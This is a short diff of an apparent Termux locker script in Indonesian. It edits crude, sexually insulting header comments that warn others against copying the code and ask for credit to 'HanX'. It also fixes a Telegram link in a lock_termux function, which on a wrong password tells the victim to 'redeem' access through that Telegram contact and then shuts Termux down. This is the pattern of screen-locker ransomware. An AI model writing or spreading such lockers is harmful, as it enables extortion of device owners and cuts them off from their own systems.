@@ -1,6 +1,6 @@
-#wkwk mau recode ya dek? jangan ya dek ya😹
-#yg recode kontol nya berkurang 5 cm
-#apa liat-liat, pake tinggal pake aj lah
+# wkwk mau recode ya dek? jangan ya dek ya😹
+# yg recode kontol nya berkurang 5 cm
+# klo mau recode jan lupa taro credit HanX
 
 
 #!/data/data/com.termux/files/usr/bin/bash
@@ -85,7 +85,7 @@ def lock_termux():
             remove_lock() 
             return  
         
-        print(f"\033[1;31m—Password Salah!\n—Tebus Ke Tele = https://t..me/hanxshiroko\033[0m")
+        print(f"\033[1;31m—Password Salah!\n—Tebus Ke Tele = https://t.me/hanxshiroko\033[0m")
 
     print("\n\033[1;31m—Aksess Di Tolak! Mematikan Termux...\033[0m")
     time.sleep(1)
